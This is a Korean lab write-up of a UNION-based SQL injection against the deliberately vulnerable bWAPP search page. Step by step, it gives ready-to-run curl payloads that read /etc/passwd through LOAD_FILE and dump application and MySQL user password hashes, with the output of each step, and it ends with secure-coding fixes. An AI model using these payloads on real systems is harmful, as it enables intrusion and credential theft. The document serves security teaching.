# 웹 해킹 실습 교육: SQL Injection (GET/Search)

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/sqli_1.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### SQL Injection이란?

웹 애플리케이션이 사용자로부터 입력받은 값을 데이터베이스 조회를 위한 SQL 쿼리에 사용할 때, **입력값에 대한 검증 처리가 누락**되어 발생합니다.

공격자는 이를 악용해 악의적인 SQL 구문을 주입(Injection)하여:
- 데이터베이스 내 **민감한 데이터를 전부 조회**하거나 조작
- 데이터베이스 및 **서버 시스템의 파일 데이터** 접근 (`LOAD_FILE()`)
- 심각한 경우 데이터베이스 서버 제어 권한 획득 등을 수행할 수 있습니다.

이번 실습 대상인 `sqli_1.php`는 영화 검색 기능을 제공하며 검색어 전달 값(`title`)이 SQL 구문에 필터링 없이 그대로 들어가기 때문에 **UNION Based SQL Injection**이 가능합니다.

### OWASP Top 10 분류
- **A03:2021** – Injection

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] bWAPP 로그인 및 セ션 유지 (bee/bug)
        │
        ▼
[2단계] 대상 페이지 (sqli_1.php) 분석
        (검색어 'iron' 입력 등 정상 동작 확인)
        │
        ▼
[3단계] SQLi 컬럼 개수 파악
        (ORDER BY 또는 UNION SELECT 절 활용)
        │
        ▼
[4단계] 시스템 DB 정보 조회
        (UNION SELECT 1,database(),user(),@@version... 활용)
        │
        ▼
[5단계] 시스템 파일 탈취 (LOAD_FILE)
        (/etc/passwd, 데이터베이스 서버 계정/해쉬 탈취)
        │
        ▼
[6단계] 애플리케이션 사용자 데이터베이스 탈취
        (bWAPP DB의 users 테이블의 정보 유출)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 세션 유지 및 정상 동작 확인

이전 실습에서 획득한 세션 쿠키(`bwapp_cookie.txt`)를 활용하여 정상적인 영화 검색 기능을 확인합니다.

```bash
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title=iron&action=search" | grep -i "Iron Man"
```

> 💡 정상 호출 시 영화 "Iron Man" 관련 릴리즈 연도 정봏 등이 반환되는 것을 알 수 있습니다.

---

### Step 2: 컬럼 개수 파악 (UNION SELECT)

SQL 쿼리를 조작하여 UNION 구문을 사용하려면 앞선 백엔드 쿼리의 반환 컬럼 개수를 먼저 알아내야 합니다.

```bash
# 7개의 컬럼이 존재하는지 테스트
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title=iron'%20UNION%20SELECT%201,2,3,4,5,6,7--%20-&action=search" | grep -i -A 10 "<tr height=\"30\">"
```

**실행 결과:**
```html
<tr height="30">
    <td>2</td>
    <td align="center">3</td>
    <td>5</td>
    <td align="center">4</td>
    <td align="center"><a href="http://www.imdb.com/title/6" target="_blank">Link</a></td>
</tr>
```

> 🚨 **취약점 확인**: `title=iron'` 에 홑따옴표가 주입되면서 문법 오류나 변환을 발생시키고, 뒤이어 `UNION SELECT 1..7` 구문이 정상 작동하여 데이터베이스 컬럼의 2,3,5,4번째 데이터가 화면에 출력됨을 확인했습니다.

---

### Step 3: 데이터베이스 환경 정보 추출

현재 사용중인 DB 접속 계정, 데이터베이스 이름, DBMS 버전을 출력하는 쿼리입니다.

```bash
# 데이터베이스 주요 정보 추출 (database(), user(), @@version)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title='%20UNION%20SELECT%201,database(),user(),@@version,5,6,7--%20-&action=search" | grep -i -A 10 "<tr height=\"30\">"
```

**실행 결과:**
```html
<tr height="30">
    <td>bWAPP</td>
    <td align="center">root@localhost</td>
    <td>5</td>
    <td align="center">5.0.96-0ubuntu3</td>
...
```

> 💡 **심각한 보안 위협**: 접속 계정이 `root@localhost` 입니다. DB 자체의 최고 권한(root)으로 연결되어 있어 OS 시스템 파일 제어까지 가능해집니다.

---

### Step 4: 시스템 파일 탈취 (`LOAD_FILE`)

MySQL의 루트 권한이 있는 점계를 이용해 커널/OS 레벨의 민감한 파일(`/etc/passwd`)을 직접 읽어 화면으로 빼돌립니다.

```bash
# 리눅스 시스템 정보 유출
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title='%20UNION%20SELECT%201,LOAD_FILE(%22/etc/passwd%22),3,4,5,6,7--%20-&action=search" | grep -i -A 10 "root:x:0:0"
```

**실행 결과 (탈취된 계정 정보):**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

---

### Step 5: 애플리케이션 사용자 (bWAPP) 데이터베이스 유출

`bWAPP.users` 테이블에서 웹 서비스에 가입된 실제 사용자의 아이디, 비밀번호 해쉬, 이메일, 비밀키 등의 중요한 개인정보를 추출할 수 있습니다. 

```bash
# bWAPP 사용자 정보 추출 (login, password hash, email, secret)
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title='%20UNION%20SELECT%201,login,password,email,secret,6,7%20FROM%20bWAPP.users--%20-&action=search" | grep -i -A 10 "<tr height=\"30\">" | tail -15
```

**실행 결과:**
```html
<tr height="30">
    <td>test</td>
    <td align="center">a94a8fe5ccb19ba61c4c0873d391e987982fbbd3</td>
    <td>test</td>
    <td align="center">test@test.com</td>
    <td align="center"><a href="http://www.imdb.com/title/6" target="_blank">Link</a></td>
</tr>
```

> 💡 **개인정보 유출 사고의 핵심 원인**: 이처럼 관리자 권한 없이도 웹 애플리케이션 자체의 취약점을 통해 해당 서비스에 가입된 모든 회원의 중요 정보(이메일, 비밀번호 해시 등)가 통째로 유출되는 2차 피해가 발생합니다.

---

### Step 6: MySQL 계정 및 비밀번호 해쉬 유출

데이터베이스 루트 권한을 사용해 DBMS 자체의 다른 접속 계정과 비밀번호 해쉬도 유출할 수 있습니다.

```bash
# users 테이블 비밀번호 및 정보 조회
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/sqli_1.php?title='%20UNION%20SELECT%201,CONCAT(user,':',password),3,4,5,6,7%20FROM%20mysql.user--%20-&action=search" | grep -A 5 "debian-sys-maint"
```

**실행 결과:**
```html
<td>debian-sys-maint:*D4749CBC6F877E93F4A942F787C272224CC91D4A</td>
<td align="center">3</td>
```

---

## 📊 탈취 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **데이터베이스 명** | `bWAPP` |
| **접속 DB 계정** | `root@localhost` |
| **DBMS 버전** | `5.0.96-0ubuntu3` (MySQL) |
| **운영체제 파일** | `/etc/passwd` 정보 탈취 성공 |
| **웹 서비스 사용자** | `login`, `password`, `email`, `secret` 등 `users` 테이블 전체 회원 정보 유출 |
| **DB 해시 암호** | `debian-sys-maint` 유저 등 MySQL 시스템 인증 해시 유출 |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 발생 원인
사용자가 검색 폼에 입력한 `title` 값이 서버 처리 백엔드에 안전하게 가공되지 않고 직접 문자열 연산 방식으로 조합되어 백업 쿼리로 삽입되었습니다. 
```php
// 취약한 패턴의 예시
$sql = "SELECT * FROM movies WHERE title LIKE '%" . $_GET['title'] . "%'";
```

### 방어(Secure Coding) 가이드

1. **Prepared Statements (매개변수화된 쿼리) ⭐️**
   입력 데이터가 쿼리 구조를 변경할 수 없도록, 데이터와 쿼리를 확실히 분리하는 PDO 또는 MySQLi Prepared Statements 사용.
   ```php
   $stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?");
   $stmt->execute(['%' . $_GET['title'] . '%']);
   ```

2. **최소 권한의 원칙 (Principle of least privilege) 적용**
   DB 연결 시 `root`와 같은 막강한 권한의 시스템 계정을 사용하는 것은 치명적입니다. 단지 검색(SELECT)만 필요한 웹 애플리케이션 계정이라면 권한을 제한한 `db_user`를 분리해 사용하여야 합니다. (이 경우 `LOAD_FILE` 공격 등은 차단됩니다.)

3. **입력값 철저한 검증(Sanitization & Validation)**
   특수기호(`'`, `--`, `;` 등) 입력을 필터링 처리합니다. (`mysqli_real_escape_string()` 사용 가능하나, Prepared Statement 방식 권장).

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 시스템에 동일한 기법을 적용하는 것은  
> **정보통신망법 위반(해킹)**으로 **형사 처벌** 대상이 됩니다.  
>
> **반드시 본인 소유 또는 허가받은 환경에서만 실습하세요.**

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
